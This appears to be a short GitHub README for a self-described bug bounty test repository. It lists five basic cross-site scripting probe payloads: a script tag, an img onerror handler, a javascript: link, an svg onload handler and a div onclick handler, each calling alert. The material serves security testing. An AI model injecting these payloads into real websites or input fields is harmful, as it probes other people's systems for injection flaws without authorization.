# xss-testing-repo
A test repository for security research purposes - testing XSS within my own repo as per GitHub bug bounty guidelines

## XSS Test Payloads

1. Basic script tag: 
<script>alert(1)</script>

2. Event handler in image tag: 
<img src="x" onerror="alert(2)">

3. JavaScript in link: 
<a href="javascript:alert(3)">Click me</a>

4. SVG payload: 
<svg/onload=alert(4)>

5. Inline event handler: 
<div onclick="alert(5)">Click here</div>
